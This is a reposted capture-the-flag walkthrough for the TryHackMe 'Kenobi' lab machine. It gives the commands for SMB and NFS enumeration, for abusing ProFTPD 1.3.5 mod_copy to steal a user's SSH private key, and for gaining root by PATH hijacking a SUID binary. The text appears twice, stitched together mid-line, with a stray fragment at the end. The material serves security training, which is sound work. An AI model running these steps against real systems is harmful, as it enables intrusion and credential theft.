****Difficulty level****: Easy  
**Info**: Walkthrough on exploiting a Linux machine. Enumerate Samba for shares, manipulate a vulnerable version of proftpd and escalate your privileges with path variable manipulation.

**Link**: [https://www.tryhackme.com/room/kenobi](https://www.tryhackme.com/room/kenobi)

> I did not author this write up, I am just saving myself the work of typing it all our for reference
Original Author: https://blog.razrsec.uk/kenobi-walkthrough/

# Information Gathering

The target IP address is provided when the machine is deployed.

****Target:**** _10.10.245.98_

# Scanning

First, let's scan the machine with _nmap_ to determine open ports and services.

```
nmap -sC -sV -vv 10.10.245.98
```

![](https://blog.razrsec.uk/content/images/2020/05/image-2.png)

From this we can see the following ports and services:

-   port 21/tcp - FTP - (ProFTPD 1.3.5)
-   port 22/tcp - SSH - (OpenSSH 7.2.p2)
-   port 80/tcp - HTTP - (Apache httpd 2.4.18)
-   port 111/tcp - RPC - (rpcbind, NFS access)
-   port 139/tcp - Samba
-   port 445/tcp - Samba
-   port 2049/tcp - nfs_acl

# Enumeration

Let's take a look at those SMB shares by running _nmap_ smb enumeration scripts:

```
nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse 10.10.245.98
```

![](https://blog.razrsec.uk/content/images/2020/05/image-4.png)

OK, a few shares found, let's investigate the _anonymous_ share:

```
smbclient //10.10.245.98/anonymous
```

![](https://blog.razrsec.uk/content/images/2020/05/image-5.png)

The _anonymous_ share can also be recursively downloaded with the command:

```
smbget -R smb://10.10.245.98/anonymous
```

Inspecting the _log.txt_ file reveals information for Kenobi when generating an SSH key for the user and information about the ProFTPD server.

Port 111 is running the _rpcbind_ service. This is a server that converts the remote procedure call (RPC) program number into universal addresses. When an RPC service is started, it tells _rpcbind_ the address at which it is listening and the RPC program number it is prepared to serve.

Here, port 111 is access to a network file system, which can be enumerated with _nmap_ to show the mounted volumes:

```
nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount 10.10.245.98
```

![](https://blog.razrsec.uk/content/images/2020/05/image-6.png)

# Gaining Access

In our initial _nmap_ scan we found ProFTPD 1.3.5 running on port 21. This can also be determined by connecting to the target machine on the FTP port using _netcat_:

```
nc 10.10.245.98 21
```

![](https://blog.razrsec.uk/content/images/2020/05/image-8.png)

_Searchsploit_ is a command-line tool for [exploit-db.com](https://www.exploit-db.com/), which we can use to find exploits for a particular software version:

```
searchsploit proftpd 1.3.5
```

![](https://blog.razrsec.uk/content/images/2020/05/image-9.png)

The output shows an exploit for ProFTPD's _[mod_copy](http://www.proftpd.org/docs/contrib/mod_copy.html)_ module. This module will allow us to use it's SITE CPFR and SITE CPTO commands to copy files/directories from one place to another on the server. Any unauthenticated client can leverage these commands to copy files from any part of the filesystem to a chosen destination.

We know from the _log.txt_ file that the FTP service is running as the Kenobi user and an SSH key is generated for that user. We also know that we have access to the _/var_ directory, which we can mount on our system.

Kenobi's private key can be copied to the _/var/tmp_ directory by running:

```
nc 10.10.245.98 21
SITE CPFR /home/kenobi/.ssh/id_rsa
SITE CPTO /var/tmp/id_rsa
```

![](https://blog.razrsec.uk/content/images/2020/05/image-10.png)

The _/var_ directory can then be mounted to our machine:

```
mkdir /mnt/kenobiNFS
mount 10.10.245.98:/var /mnt/kenobiNFS
ls -la /mnt/kenobiNFS
```

![](https://blog.razrsec.uk/content/images/2020/05/image-11.png)

Now that we have a network mount on our machine we can obtain the private key which can be used to login to Kenobi's account:

```
cp /mnt/kenobiNFS/tmp/id_rsa .
sudo chmod 600 id_rsa
```

```
ssh -i id_rsa kenobi@10.10.245.98
```

![](https://blog.razrsec.uk/content/images/2020/05/image-12.png)

Once logged in as Kenobi, the user fag can be obtained from the _/home/kenobi/user.txt_ file (flag not shown so you can grab this yourself).

# Privilege Escalation

All that remains is to escalate our privileges and become the _root_ user!

SUID (Set owner User ID up on execution) is a special type of file permissions given to a file. SUID bits can be extremely dangerous. Some binaries such as _passwd_ need to be run with elevated privileges (as its resetting your password on the system). However, other custom files that have the SUID bit can lead to all sorts of issues.

We can search the system to look for files with a misconfigured SUID bit in order to elevate our privileges:

```
find / -perm -u=s -type f 2>/dev/null
```

![](https://blog.razrsec.uk/content/images/2020/05/image-13.png)

The _/usr/bin/menu_ file looks out of the ordinary here. Let's run this:

```
/usr/bin/menu
```

![](https://blog.razrsec.uk/content/images/2020/05/image-14.png)

_Strings_ is a command on Linux that finds and prints text strings embedded in binary files.

Running the _strings_ command on the _/usr/bin/menu_ binary we can see that this is running without a full path (i.e. not using _/usr/bin/curl_ or _/usr/bin/uname_):

![](https://blog.razrsec.uk/content/images/2020/05/image-19.png)

As this file runs with the root users privileges the path can be manipulated to gain a root shell.

We can copy the _/bin/sh_ shell into a file named _curl_,  then change the permissions of the file to be readable, writeable and executable for all users. Finally, we can add the location of our _curl_ file containing the shell to the system path.

```
cd /tmp
echo /bin/sh > curl
chmod 777 curl
export PATH=/tmp:$PATH
```

![](https://blog.razrsec.uk/content/images/2020/05/image-20.png)

This means that when the _/usr/bin/menu_ binary is run, it will be using our path variable to find the _curl_ binary we have created (which is actually a version of the _/usr/sh_ shell) and run this as _root_...

```
/usr/bin/menu
```

![](https://blog.razrsec.uk/content/images/2020/05/image-18.png)

..and we now have _root_ access!

All that's left is to grab the root flag from _/root/root.txt_, which I will leave for you to do :)****Difficulty level****: Easy  
**Info**: Walkthrough on exploiting a Linux machine. Enumerate Samba for shares, manipulate a vulnerable version of proftpd and escalate your privileges with path variable manipulation.

**Link**: [https://www.tryhackme.com/room/kenobi](https://www.tryhackme.com/room/kenobi)

# Information Gathering

The target IP address is provided when the machine is deployed.

****Target:**** _10.10.245.98_

# Scanning

First, let's scan the machine with _nmap_ to determine open ports and services.

```
nmap -sC -sV -vv 10.10.245.98
```

![](https://blog.razrsec.uk/content/images/2020/05/image-2.png)

From this we can see the following ports and services:

-   port 21/tcp - FTP - (ProFTPD 1.3.5)
-   port 22/tcp - SSH - (OpenSSH 7.2.p2)
-   port 80/tcp - HTTP - (Apache httpd 2.4.18)
-   port 111/tcp - RPC - (rpcbind, NFS access)
-   port 139/tcp - Samba
-   port 445/tcp - Samba
-   port 2049/tcp - nfs_acl

# Enumeration

Let's take a look at those SMB shares by running _nmap_ smb enumeration scripts:

```
nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse 10.10.245.98
```

![](https://blog.razrsec.uk/content/images/2020/05/image-4.png)

OK, a few shares found, let's investigate the _anonymous_ share:

```
smbclient //10.10.245.98/anonymous
```

![](https://blog.razrsec.uk/content/images/2020/05/image-5.png)

The _anonymous_ share can also be recursively downloaded with the command:

```
smbget -R smb://10.10.245.98/anonymous
```

Inspecting the _log.txt_ file reveals information for Kenobi when generating an SSH key for the user and information about the ProFTPD server.

Port 111 is running the _rpcbind_ service. This is a server that converts the remote procedure call (RPC) program number into universal addresses. When an RPC service is started, it tells _rpcbind_ the address at which it is listening and the RPC program number it is prepared to serve.

Here, port 111 is access to a network file system, which can be enumerated with _nmap_ to show the mounted volumes:

```
nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount 10.10.245.98
```

![](https://blog.razrsec.uk/content/images/2020/05/image-6.png)

# Gaining Access

In our initial _nmap_ scan we found ProFTPD 1.3.5 running on port 21. This can also be determined by connecting to the target machine on the FTP port using _netcat_:

```
nc 10.10.245.98 21
```

![](https://blog.razrsec.uk/content/images/2020/05/image-8.png)

_Searchsploit_ is a command-line tool for [exploit-db.com](https://www.exploit-db.com/), which we can use to find exploits for a particular software version:

```
searchsploit proftpd 1.3.5
```

![](https://blog.razrsec.uk/content/images/2020/05/image-9.png)

The output shows an exploit for ProFTPD's _[mod_copy](http://www.proftpd.org/docs/contrib/mod_copy.html)_ module. This module will allow us to use it's SITE CPFR and SITE CPTO commands to copy files/directories from one place to another on the server. Any unauthenticated client can leverage these commands to copy files from any part of the filesystem to a chosen destination.

We know from the _log.txt_ file that the FTP service is running as the Kenobi user and an SSH key is generated for that user. We also know that we have access to the _/var_ directory, which we can mount on our system.

Kenobi's private key can be copied to the _/var/tmp_ directory by running:

```
nc 10.10.245.98 21
SITE CPFR /home/kenobi/.ssh/id_rsa
SITE CPTO /var/tmp/id_rsa
```

![](https://blog.razrsec.uk/content/images/2020/05/image-10.png)

The _/var_ directory can then be mounted to our machine:

```
mkdir /mnt/kenobiNFS
mount 10.10.245.98:/var /mnt/kenobiNFS
ls -la /mnt/kenobiNFS
```

![](https://blog.razrsec.uk/content/images/2020/05/image-11.png)

Now that we have a network mount on our machine we can obtain the private key which can be used to login to Kenobi's account:

```
cp /mnt/kenobiNFS/tmp/id_rsa .
sudo chmod 600 id_rsa
```

```
ssh -i id_rsa kenobi@10.10.245.98
```

![](https://blog.razrsec.uk/content/images/2020/05/image-12.png)

Once logged in as Kenobi, the user flag can be obtained from the _/home/kenobi/user.txt_ file (flag not shown so you can grab this yourself).

# Privilege Escalation

All that remains is to escalate our privileges and become the _root_ user!

SUID (Set owner User ID up on execution) is a special type of file permissions given to a file. SUID bits can be extremely dangerous. Some binaries such as _passwd_ need to be run with elevated privileges (as its resetting your password on the system). However, other custom files that have the SUID bit can lead to all sorts of issues.

We can search the system to look for files with a misconfigured SUID bit in order to elevate our privileges:

```
find / -perm -u=s -type f 2>/dev/null
```

![](https://blog.razrsec.uk/content/images/2020/05/image-13.png)

The _/usr/bin/menu_ file looks out of the ordinary here. Let's run this:

```
/usr/bin/menu
```

![](https://blog.razrsec.uk/content/images/2020/05/image-14.png)

_Strings_ is a command on Linux that finds and prints text strings embedded in binary files.

Running the _strings_ command on the _/usr/bin/menu_ binary we can see that this is running without a full path (i.e. not using _/usr/bin/curl_ or _/usr/bin/uname_):

![](https://blog.razrsec.uk/content/images/2020/05/image-19.png)

As this file runs with the root users privileges the path can be manipulated to gain a root shell.

We can copy the _/bin/sh_ shell into a file named _curl_,  then change the permissions of the file to be readable, writeable and executable for all users. Finally, we can add the location of our _curl_ file containing the shell to the system path.

```
cd /tmp
echo /bin/sh > curl
chmod 777 curl
export PATH=/tmp:$PATH
```

![](https://blog.razrsec.uk/content/images/2020/05/image-20.png)

This means that when the _/usr/bin/menu_ binary is run, it will be using our path variable to find the _curl_ binary we have created (which is actually a version of the _/usr/sh_ shell) and run this as _root_...

```
/usr/bin/menu
```

![](https://blog.razrsec.uk/content/images/2020/05/image-18.png)

..and we now have _root_ access!

All that's left is to grab the root flag from _/root/root.txt_, which I will leave for you to do :
l
